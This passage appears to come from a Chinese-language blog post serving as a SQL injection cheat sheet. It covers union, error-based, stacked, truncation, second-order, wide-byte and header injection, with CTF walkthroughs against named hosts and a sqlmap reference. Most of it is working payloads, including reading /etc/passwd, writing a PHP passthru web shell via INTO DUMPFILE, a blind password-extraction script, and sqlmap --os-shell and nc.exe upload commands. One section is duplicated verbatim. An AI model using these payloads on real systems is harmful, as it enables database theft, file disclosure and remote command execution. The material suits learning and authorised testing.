requests.post(url, headers=headers, data=data).text</span><br><span class="line">        html = re.findall(<span class="string">r"&lt;p align='center'&gt;(.*?)&lt;/p&gt;"</span>, html, re.S)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'username does not exist!'</span> <span class="keyword">in</span> html:</span><br><span class="line">            answer += j</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">print</span> answer</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'password is '</span>, answer</span><br></pre></td></tr></table></figure>



<h2 id="查询注入"><a href="#查询注入" class="headerlink" title="查询注入"></a>查询注入</h2><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>union将多个命令拼接起来,union all差别不大！</p>
<p>如<code>id=-1 union select 1,2,3</code> 当id找不到时就会执行union的子句！</p>
<p><strong>注入流程</strong></p>
<ol>
<li><p>判断字段数</p>
</li>
<li><p>判断回显位置</p>
</li>
<li><p>获取库名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id =-1 union select user(),database(),3 # 获取到数据库 dede</span><br><span class="line">id=-1 union select 1,(select schema_name from information_schema.schemata limit 0,1),3 # 获取其他数据库</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,(select table_name from information_schema.tables where table_schema=&apos;dede&apos; limit 0,1),3 # 获取到表名 user</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,(select column_name from information_schema.columns where table_schema=&apos;dede&apos; limit 0,1),3 # 获取到字段 ：username,password</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id=-1 union select (select username from dede.users limit 0,1),(select password from dede.users limit 0,1),3</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ul>
<li>通过修改 limit 子句依次查看所有表和字段</li>
</ul>
<ol start="7">
<li><p>读写文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&apos; union select null,load_file(&apos;/etc/passwd&apos;)--+</span><br><span class="line">1&apos; union select null, concat(user,0x3a,password) from users INTO OUTFILE &apos;/tmp/a.db&apos;--</span><br><span class="line">1&apos; union select null,&quot;&lt;?php passthru($_GET[&apos;cmd&apos;]); ?&gt;&quot; INTO DUMPFILE &quot;/tmp/shell.php&quot; --+</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="堆叠查询"><a href="#堆叠查询" class="headerlink" title="堆叠查询"></a>堆叠查询</h3><p>堆叠查询可以执行多条语句，以<code>;</code>分开，堆叠查询注入就是利用了这个特点，在第二个SQL语句中构造自己要执行的语句！</p>
<p><strong>注入语句</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id =1&apos; ;select if(ord(substring(user(),1,1))=114,sleep(3),1)%23</span><br><span class="line">id =1&apos; ;select if(select table_name from information_schema.tables where tables_schema=database() limit 0,1,1,1)=&apos;u&apos;,sleep(3),1)%23</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>程序将输入的数据带入了数据库执行，导致报错！</p>
<p>我们可以通过floor()、updatexml()等函数将要查询的内容输出到页面！</p>
<p>另外，我们可以通过<code>^</code>，将 id 的内容与 payload</p>
<p><strong>注入流程</strong></p>
<ol>
<li>获取库名</li>
<li>获取表名</li>
<li>获取列名</li>
<li>获取内容</li>
</ol>
<p><strong>注入公式</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># floor</span><br><span class="line">id=1&apos; </span><br><span class="line">and (select 1 from (select count(*),concat(0x7e,(select databse()),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>floor(rand(0)*2))x</code> 产生 011011 的定性序列</p>
</li>
<li><p>报错的前提条件是 from table 的 table 中存在至少 3 条数据</p>
</li>
<li><p>数据量少的时候只能用 rand()*2 ，随机产生 0101 序列时会报错</p>
</li>
<li><p><code>group by floor(rand(0)*2))</code> 会造成主键冗余报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">key			count(*)</span><br><span class="line"># 第一次计算,结果为0,0不存在,则 floor(rand(0)*2))会被再计算一次,结果为1 ,插入虚表</span><br><span class="line">1             1</span><br><span class="line"># 第三次计算,结果为1,1存在,于是统计加1,所以 floor(rand(0)*2))不会再计算第二次</span><br><span class="line">1			 2</span><br><span class="line"># 第三次计算,结果为0,0不存在,则 floor(rand(0)*2))会被再计算一次,结果为1 ,插入虚表</span><br><span class="line">1			 2</span><br><span class="line">1             1</span><br><span class="line"># 自此，主键冗余而报错</span><br></pre></td></tr></table></figure>

</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># updatexml(XML_document, XPath_string, new_value) </span><br><span class="line">1&apos;and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<ul>
<li>第二个参数需要是 Xpath 格式的字符串，输入不符合时就会报错</li>
<li>很明显 <code>concat(0x7e,(select user()),0x7e)</code>连成的字符串,不会符合<code>XPATH_string</code>的格式</li>
<li>updatexml的最大输出长度为32位</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># extractvalue(XML_document, XPath_string)</span><br><span class="line">1&apos;and extractvalue(1,concat(0x5c,(select user())))--+</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># exp</span><br><span class="line">1&apos; and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>

<ul>
<li>溢出报错</li>
</ul>
<p><strong>CTF题目</strong></p>
<p><a href="http://123.206.87.240:9004/Once_More.php?id=1" target="_blank" rel="noopener">http://123.206.87.240:9004/Once_More.php?id=1</a></p>
<p> 解题思路：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://123.206.87.240:9004/Once_More.php?id=1%27and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)--+</span><br><span class="line">http://123.206.87.240:9004/Once_More.php?id=1%27and%20updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;web1002-2&quot; and table_name=&apos;flag2&apos;),0x7e),1)--+</span><br><span class="line">http://123.206.87.240:9004/Once_More.php?id=1%27and%20updatexml(1,concat(0x7e,(select group_concat(flag2) from flag2),0x7e),1)--+</span><br></pre></td></tr></table></figure>



<h2 id="约束攻击"><a href="#约束攻击" class="headerlink" title="约束攻击"></a>约束攻击</h2><p>在处理SQL中的字符串时，字符串末尾的空格字符都会被删除，以下两个查询语句的结果是相同的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&apos;vampire     &apos;;</span><br><span class="line">SELECT * FROM users WHERE username=&apos;vampire&apos;;</span><br></pre></td></tr></table></figure>

<p>在任意 INSERT 查询中，SQL会根据varchar(n)来限制字符串的最大长度，也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符 !</p>
<p>现在假设存在users表，包含username和password两个字段，约束条件都是 varchar(10) 。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create table users(</span><br><span class="line">	username varchar(10),</span><br><span class="line">    passsword varchar(10)</span><br><span class="line">);</span><br><span class="line">insert into users values(&apos;root&apos;,&apos;root&apos;);</span><br></pre></td></tr></table></figure>

<p>现在我们再插入一个用户 <code>root       1</code>，用以越权登录已存在的 root 用户。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into users values(&apos;root       1&apos;,&apos;toor&apos;);</span><br></pre></td></tr></table></figure>

<p>现在搜索 root 用户，会返回两个结果，我们后者登录的话，则所有搜索该用户名的SELECT查询都将返回第一个数据记录，也就是原始的数据记录。</p>
<p>注意：MySQL5.5以上版本需要设置数据库为宽松模式,避免出现插入错误error</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set @@sql_mode=ANSI;</span><br></pre></td></tr></table></figure>

<p>具体内容参考：<a href="https://xz.aliyun.com/t/3992#toc-6" target="_blank" rel="noopener">https://xz.aliyun.com/t/3992#toc-6</a></p>
<p><strong>CTF 题目</strong> </p>
<p><a href="http://123.206.31.85:49163/" target="_blank" rel="noopener">http://123.206.31.85:49163/</a></p>
<p>解题思路：</p>
<ol>
<li>创建用户 <code>admin                               1</code>，密码：Aa123456</li>
<li>使用新建用户登录即可越权（admin:Aa123456）</li>
<li>SKCTF{4Dm1n_HaV3_GreAt_p0w3R}</li>
</ol>
<h2 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h2><p>参数污染也就是常说的 HPP (HTTP Parameter Pollution) , 这也是一种注入型的漏洞，攻击者通过在HTTP请求中插入特定的参数来发起攻击 !</p>
<p>通过hpp参数污染可以达到绕过sqlwaf，上传waf来进行攻击 ! </p>
<p>在与服务器交互的过程中，http允许 get 或者post多次传同一参数值，造成覆盖达到一些绕过 waf 的效果。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">https://cn.bing.com/search?q=bb&amp;q=cc</span><br><span class="line">https://www.gogle.com/search?q=bb&amp;q=cc</span><br></pre></td></tr></table></figure>

<p>但是不同的服务器处理方式会不一样，bing 只会查询最后的参数，而谷歌会全部查询。</p>
<p>下面这个表简单列举了一些常见的Web服务器对同样名称的参数出现多次的处理方式：</p>
<table>
<thead>
<tr>
<th>PHP</th>
<th>Last</th>
</tr>
</thead>
<tbody><tr>
<td>JSP</td>
<td>First</td>
</tr>
<tr>
<td>CGI</td>
<td>First</td>
</tr>
<tr>
<td>Python</td>
<td>ALL</td>
</tr>
<tr>
<td>ASP</td>
<td>ALL</td>
</tr>
</tbody></table>
<p>HPP 常用于 SQL 注入 waf 绕过 、双文件上传 、XSS 等攻击场景 ！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bbs=u&amp;bbs=n&amp;bbs=i&amp;bbs=o&amp;bbs=n&amp;bbs=select 1,user(),3</span><br></pre></td></tr></table></figure>



<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>简单来说，当程序将第一次注入的藏数据转义后存储到数据库中，第二次注入通过查询之前的脏数据来绕过 waf ，实现SQL注入。</p>
<img src="http://ww1.sinaimg.cn/large/006nFhrCly1gg5pptbwhlj30k009h0th.jpg"/>

<p>以 <strong>sql-labs lesson-24</strong> 为例</p>
<p>解题思路：</p>
<ol>
<li>注册账号 <code>admin&#39; #</code></li>
<li>修改 <code>admin&#39; #</code> 的密码为 <code>new_password</code>，此时其实修改的是 <code>admin</code> 用户的密码</li>
<li>登录账号 <code>admin</code>，密码为  <code>new_password</code></li>
</ol>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>宽字节注入是利用 MySQL 的一个特性，MySQL 在使用 GBK 编码的时候，会认为两个字符是一个汉字(前一个字符的 ascii 码要大于128,才达到汉字的范围) 。</p>
<p>在使用addslashes函数的时候，某些字符前会加上<code>\</code>，包括<code>&#39;、&quot;、|、NULL</code></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">'  =&gt; \' =&gt;  %5C%27</span><br><span class="line">%df ' =&gt; %df\' =&gt; %df%5C%27</span><br></pre></td></tr></table></figure>

<ul>
<li>在解码时，<code>%df%5C</code> 会被认为是一个汉字 <code>運</code></li>
</ul>
<p><strong>CTF题目</strong></p>
<p><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p>
<p>解题思路：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df&apos; order by 2%23</span><br><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&apos; union select 1,2%23	#判断回显位置</span><br><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&apos; union select 1,table_name from information_schema.tables where table_schema=database()%23 #获取到第一个表 ctf</span><br><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23 #获取所有表</span><br><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x637466%23 #将ctf做16进制转码</span><br></pre></td></tr></table></figure>

<p>SQLmap的使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27"</span> --hex</span><br></pre></td></tr></table></figure>

<ul>
<li>将 %df 一起拼接到注入的参数中</li>
<li><code>--hex</code> 可以模拟手工注入过程中对表名等进行16进制编码</li>
</ul>
<h2 id="HTTP头-注入"><a href="#HTTP头-注入" class="headerlink" title="HTTP头 注入"></a>HTTP头 注入</h2><p>有时候开发人员为了方便，会对客户端的http header信息进行获取并使用SQL进行处理，这也造成了HTTP头注入的可能性！</p>
<p>包括以下几个常见的注入点：</p>
<ul>
<li>UA</li>
<li>Cookies</li>
<li>X-Forwarded-For</li>
</ul>
<h3 id="XFF-注入"><a href="#XFF-注入" class="headerlink" title="XFF 注入"></a>XFF 注入</h3><p>该注入原理是通过修改 X-Forwarded-For 头对带入系统的 dns 进行 sql 注入，从而得到网站的数据库内容！</p>
<p>XFF也就是HTTP的请求端真实的IP，通常一些网站的防注入功能会记录请求端真实IP地址并写入数据，而通过修改XXF头可以实现伪造IP！</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">X-Forwarded-For：127.0.0.1</span></span><br></pre></td></tr></table></figure>

<p><strong>CTF题目</strong></p>
<p><a href="http://123.206.31.85:1003/" target="_blank" rel="noopener">http://123.206.31.85:1003/</a></p>
<p>解题思路：</p>
<ol>
<li><p>发现输入任意用户密码都会禁 ip </p>
</li>
<li><p>Burp改包，加入 <code>X-Forwarded-For：127.0.0.1</code></p>
</li>
<li><p>爆破用户密码，得到 flag</p>
<img src="http://ww1.sinaimg.cn/large/006nFhrCly1gg5syvakhdj30k80923zb.jpg" width="600"/>

</li>
</ol>
<h3 id="Cookie-注入"><a href="#Cookie-注入" class="headerlink" title="Cookie 注入"></a>Cookie 注入</h3><p>Cookie 注入和常规的注入的区别就是参数存储在 cookie 字段中，只是注入位置不同而已，方法一样！</p>
<p>类似的还有UA注入！</p>
<p><strong>CTF题目</strong></p>
<p>pikachu-sqli_header，自行安装！</p>
<p>解题思路1：通过UA注入</p>
<ol>
<li>通过登陆后的内容判断，后端应该对http header里面的数据进行了获取，并传入数据库</li>
</ol>
<img src="http://ww1.sinaimg.cn/large/006nFhrCly1gg5tnkzlnij30ow08s74u.jpg" width="600"/>

<ol start="2">
<li>抓取登陆数据包，修改UA为<code>&#39;</code>，页面报错</li>
<li>构造 payload ：1’ and updatexml (1,concat (0x7e,database()),0) or ‘</li>
</ol>
<img src="http://ww1.sinaimg.cn/large/006nFhrCly1gg5tzrqfooj30qk0aataa.jpg" width="600"/>

<p>解题思路2：通过cookie注入</p>
<ol>
<li>在 cookie 中的用户名字段加 <code>&#39;</code>，报错，判断此处存在注入</li>
<li>构造 payload：admin’ and updatexml (1,concat (0x7e,database()),0) or ‘</li>
</ol>
<img src="http://ww1.sinaimg.cn/large/006nFhrCly1gg5tycqau6j30qs0ad403.jpg" width="600"/>

<p>SQLmap的使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/pikachu/vul/sqli/sqli_header/sqli_header.php"</span> --cookie <span class="string">"uname=admin"</span> --table --level 3</span><br><span class="line">sqlmap -r 1.txt --level 3 --random-agent</span><br></pre></td></tr></table></figure>

<h2 id="Base64-注入"><a href="#Base64-注入" class="headerlink" title="Base64 注入"></a>Base64 注入</h2><p>对参数进行base64编码，再发送请求。</p>
<p>说明：id=1’，1的base64编码为<code>MSc=</code>，而<code>=</code>的url编码为<code>%3d</code>，所以得到以下结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id=MSc%3d</span><br></pre></td></tr></table></figure>

<h2 id="HTTP头-注入-1"><a href="#HTTP头-注入-1" class="headerlink" title="HTTP头 注入"></a>HTTP头 注入</h2><p>有时候开发人员为了方便，会对客户端的http header信息进行获取并使用SQL进行处理，这也造成了HTTP头注入的可能性！</p>
<p>包括以下几个常见的注入点：</p>
<ul>
<li>UA</li>
<li>Cookies</li>
<li>X-Forwarded-For</li>
</ul>
<h3 id="XFF-注入-1"><a href="#XFF-注入-1" class="headerlink" title="XFF 注入"></a>XFF 注入</h3><p>该注入原理是通过修改 X-Forwarded-For 头对带入系统的 dns 进行 sql 注入，从而得到网站的数据库内容！</p>
<p>XFF也就是HTTP的请求端真实的IP，通常一些网站的防注入功能会记录请求端真实IP地址并写入数据，而通过修改XXF头可以实现伪造IP！</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">X-Forwarded-For：127.0.0.1</span></span><br></pre></td></tr></table></figure>

<p><strong>CTF题目</strong></p>
<p><a href="http://123.206.31.85:1003/" target="_blank" rel="noopener">http://123.206.31.85:1003/</a></p>
<p>解题思路：</p>
<ol>
<li><p>发现输入任意用户密码都会禁 ip </p>
</li>
<li><p>Burp改包，加入 <code>X-Forwarded-For：127.0.0.1</code></p>
</li>
<li><p>爆破用户密码，得到 flag</p>
<img src="http://ww1.sinaimg.cn/large/006nFhrCly1gg5syvakhdj30k80923zb.jpg" width="600"/>

</li>
</ol>
<h3 id="Cookie-注入-1"><a href="#Cookie-注入-1" class="headerlink" title="Cookie 注入"></a>Cookie 注入</h3><p>Cookie 注入和常规的注入的区别就是参数存储在 cookie 字段中，只是注入位置不同而已，方法一样！</p>
<p>类似的还有UA注入！</p>
<p><strong>CTF题目</strong></p>
<p>pikachu-sqli_header，自行安装！</p>
<p>解题思路1：通过UA注入</p>
<ol>
<li>通过登陆后的内容判断，后端应该对http header里面的数据进行了获取，并传入数据库</li>
</ol>
<img src="http://ww1.sinaimg.cn/large/006nFhrCly1gg5tnkzlnij30ow08s74u.jpg" width="600"/>

<ol start="2">
<li>抓取登陆数据包，修改UA为<code>&#39;</code>，页面报错</li>
<li>构造 payload ：1’ and updatexml (1,concat (0x7e,database()),0) or ‘</li>
</ol>
<img src="http://ww1.sinaimg.cn/large/006nFhrCly1gg5tzrqfooj30qk0aataa.jpg" width="600"/>

<p>解题思路2：通过cookie注入</p>
<ol>
<li>在 cookie 中的用户名字段加 <code>&#39;</code>，报错，判断此处存在注入</li>
<li>构造 payload：admin’ and updatexml (1,concat (0x7e,database()),0) or ‘</li>
</ol>
<img src="http://ww1.sinaimg.cn/large/006nFhrCly1gg5tycqau6j30qs0ad403.jpg" width="600"/>

<p>SQLmap的使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1/pikachu/vul/sqli/sqli_header/sqli_header.php"</span> --cookie <span class="string">"uname=admin"</span> --table --level 3</span><br><span class="line">sqlmap -r 1.txt --level 3 --random-agent</span><br></pre></td></tr></table></figure>



<h2 id="绕过关键词过滤注入"><a href="#绕过关键词过滤注入" class="headerlink" title="绕过关键词过滤注入"></a>绕过关键词过滤注入</h2><h3 id="关键字符绕过"><a href="#关键字符绕过" class="headerlink" title="关键字符绕过"></a><strong>关键字符绕过</strong></h3><p>针对常见符号和正则的过滤，可以尝试等价替换！</p>
<p><img src="http://ww1.sinaimg.cn/large/006nFhrCly1gg5yx5wnyoj30vc0rxdi0.jpg" alt="SQL.png"></p>
<h3 id="通用编码绕过"><a href="#通用编码绕过" class="headerlink" title="通用编码绕过"></a><strong>通用编码绕过</strong></h3><p>即URLEncode编码，ASCII,HEX,unicode编码绕过！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or 1=1 =&gt; %6f%72%20%31%3d%31</span><br><span class="line">Test =&gt; CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</span><br></pre></td></tr></table></figure>

<h3 id="等价函数绕过"><a href="#等价函数绕过" class="headerlink" title="等价函数绕过"></a><strong>等价函数绕过</strong></h3><p><img src="http://ww1.sinaimg.cn/large/006nFhrCly1gg61jb38lxj30s308nmxn.jpg" alt="image.png"></p>
<h3 id="模糊测试字典"><a href="#模糊测试字典" class="headerlink" title="模糊测试字典"></a><strong>模糊测试字典</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">,</span><br><span class="line">.</span><br><span class="line">_</span><br><span class="line">&apos;</span><br><span class="line">&quot;</span><br><span class="line">@</span><br><span class="line">@@</span><br><span class="line">&amp;</span><br><span class="line">&amp;&amp;</span><br><span class="line">#</span><br><span class="line">-</span><br><span class="line">+</span><br><span class="line">(</span><br><span class="line">/</span><br><span class="line">/*</span><br><span class="line">/**/</span><br><span class="line">!</span><br><span class="line">=</span><br><span class="line">!=</span><br><span class="line">&lt;&gt;</span><br><span class="line">|</span><br><span class="line">||</span><br><span class="line">*</span><br><span class="line">^</span><br><span class="line">%</span><br><span class="line">and</span><br><span class="line">union</span><br><span class="line">select</span><br><span class="line">for</span><br><span class="line">or </span><br><span class="line">in</span><br><span class="line">like</span><br><span class="line">order </span><br><span class="line">by</span><br><span class="line">outfile</span><br><span class="line">regexp</span><br><span class="line">rand</span><br><span class="line">xor</span><br><span class="line">updatexml</span><br><span class="line">exp</span><br><span class="line">floor</span><br><span class="line">extractvalue</span><br><span class="line">sleep</span><br><span class="line">benchmark</span><br><span class="line">substr</span><br><span class="line">substring</span><br><span class="line">mid</span><br><span class="line">ascii</span><br><span class="line">concat_ws</span><br><span class="line">group_concat</span><br><span class="line">concat</span><br><span class="line">hex</span><br><span class="line">bin</span><br><span class="line">ord</span><br><span class="line">strcmp</span><br><span class="line">limit</span><br><span class="line">version </span><br><span class="line">user</span><br><span class="line">database</span><br><span class="line">table</span><br><span class="line">column</span><br><span class="line">end</span><br><span class="line">else</span><br><span class="line">then</span><br><span class="line">case</span><br><span class="line">when</span><br><span class="line">if</span><br><span class="line">count</span><br><span class="line">information</span><br><span class="line">from</span><br><span class="line">to</span><br><span class="line">admin</span><br><span class="line">&lt;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="CTF题目实战"><a href="#CTF题目实战" class="headerlink" title="CTF题目实战"></a>CTF题目实战</h3><p><a href="http://123.206.87.240:8007/web2/" target="_blank" rel="noopener">http://123.206.87.240:8007/web2/</a></p>
<img src="http://ww1.sinaimg.cn/large/006nFhrCly1gg6n2axx67j30dk06n74a.jpg" width="600"/>

<p>已知用户为 admin ！</p>
<p><strong>解题思路</strong></p>
<p>1.模糊测试</p>
<p><img src="http://ww1.sinaimg.cn/large/006nFhrCly1gg6pbkv9auj30go09yglv.jpg" alt="image.png"></p>
<p>响应包长度为 367 的 payload 未被过滤，370 的被过滤 。</p>
<p>2.<code>and or ,</code>都被过滤了，但是 <code>&#39; ^</code> 未被过滤，可以采用<strong>异或注入</strong></p>
<p>3.构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname=admin&apos;^(ascii(substr(passwd)from(1)))=48^&apos;&amp;passwd=123</span><br></pre></td></tr></table></figure>

<p>另外一种方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname=admin&apos;-(ascii(substr(passwd)from(1)))=48-&apos;&amp;passwd=123</span><br></pre></td></tr></table></figure>

<h1 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h1><h2 id="Paramerter"><a href="#Paramerter" class="headerlink" title="Paramerter"></a>Paramerter</h2><p><strong>设目标：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-d		# 直接连接到数据库 -d &quot;mysql://admin:admin@192.168.21.17:3306/testdb&quot;</span><br><span class="line">-u 		# 设定目标URL</span><br><span class="line">-l 		# 从burp日志中解析目标</span><br><span class="line">-r		# 从文件中载入HTTP请求</span><br><span class="line">-g		# 处理 Google Hacking 的结果作为目标URL</span><br><span class="line">-m		# 将目标地址保存在文件中，一行为一个URL地址进行批量检测</span><br><span class="line">-p		# 指定测试的参数</span><br><span class="line">**		# 指定测试的参数 -u &quot;http://targeturl/param1/value1*/param2/value2/&quot;</span><br><span class="line">--cookie=&quot;11111&quot;        # 执行Cookie头</span><br><span class="line">–-random-agent          # 使用随机选定的HTTP User – Agent头</span><br><span class="line">--proxy=&quot;&quot;			   # 指定代理	</span><br><span class="line">--prefix=&quot;&quot;			   # 指定注入payload的字符串前缀	</span><br><span class="line">--mobile		       # 模拟测试手机环境站点	</span><br><span class="line">-smart		           # 智能判断测试</span><br></pre></td></tr></table></figure>

<p><strong>加火力：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-v 3		   # 显示注入的payload</span><br><span class="line">--level=2 (1-5) </span><br><span class="line">--risk=2  (0-3)</span><br><span class="line">–threads        # 前http(s)最大请求数 (默认 1)</span><br><span class="line">–technique=TECH # SQL注入技术测试</span><br><span class="line">–batch          # 从不询问用户输入,使用所有默认配置</span><br><span class="line">–force-ssl      # 告诉sqlmap是HTTPS请求</span><br><span class="line">–hpp            # 使用HTTP参数污染的方法</span><br><span class="line">--tamper=       # 使用给定的脚本篡改注入数据</span><br><span class="line">–time-sec=10    # DBMS响应的延迟时间（默认为5秒）</span><br></pre></td></tr></table></figure>

<p><strong>走流程：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-dbms mysql			#  指定数据库</span><br><span class="line">--current-db		#  获取当前数据库名</span><br><span class="line">--dbs		        #  获取其它数据库名</span><br><span class="line">-D [数据库名] --tables</span><br><span class="line">-D [数据库名] -T [表名] --columns</span><br><span class="line">-D [数据库名] -T [表名] -C [字段名1,字段名2] --dump</span><br></pre></td></tr></table></figure>

<p><strong>收尾巴：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--file-read	&quot;/etc/password&quot;	# 读取文件 </span><br><span class="line">--file-write	    # 上传文件</span><br><span class="line">--file-dest		    # 上传文件的绝对路径</span><br><span class="line">--os-shell		    # 交互式shell</span><br><span class="line">--os-cmd=ipconfig            </span><br><span class="line"></span><br><span class="line">–file-write &quot;nc.exe&quot; –file-dest &quot;C:/WINDOWS/Temp/nc.exe&quot;</span><br></pre></td></tr></table></figure>

<h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.test.com/index.php?id=1&quot; </span><br><span class="line">sqlmap -r getData.txt</span><br></pre></td></tr></table></figure>

<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.test.com/login.php&quot;  --data &quot;username=a&amp;password=a&quot;</span><br><span class="line">sqlmap -r postData.txt -p username</span><br><span class="line">sqlmap -u &quot;http://www.test.com/login.php&quot; –forms #自动填写表单</span><br></pre></td></tr></table></figure>

<h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><p><strong>Cookie注入：</strong>需要 level &gt;= 2</p>
<p>sqlmap -u “<a href="http://www.test.com/news.php&quot;" target="_blank" rel="noopener">http://www.test.com/news.php&quot;</a> –cookie “id=11” –level 2 </p>
<p><strong>本文作者</strong>：shavchen<br /><strong>本文地址</strong>： <a href="https://shavchen.github.io/SQL注入备忘/">https://shavchen.github.io/SQL注入备忘/</a> <br /><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" target="_blank" rel="noopener">CC BY-NC-SA 3.0 CN</a> 许可协议。转载请注明出处！</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">
  </div>
  
</article>


<!-- <div id="ad-box">
    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <ins class="adsbygoogle"
         style="display:block"
         data-ad-client="ca-pub-1769617155450062"
         data-ad-slot="6920805491"
         data-ad-format="link"
         data-full-width-responsive="true"></ins>
    <script>
    (adsbygoogle = window.adsbygoogle || []).push({});
    </script>
</div> -->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
<div class="blog-post-comments"></div>
<script>
    new Valine({
        el: '.blog-post-comments', 
        app_id: 'DgMf1NChRFNzPlOrKd3gpBPk-gzGzoHsz', 	
        app_key: 'rFtTafou49X7djrYTj4AN96G', 		    
        placeholder: '说点什么?', 
        avatar:'retro',
        notify:true,
        verify:true
    });
</script>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Article</a></li>
         
          <li><a href="/categories/">Categories</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
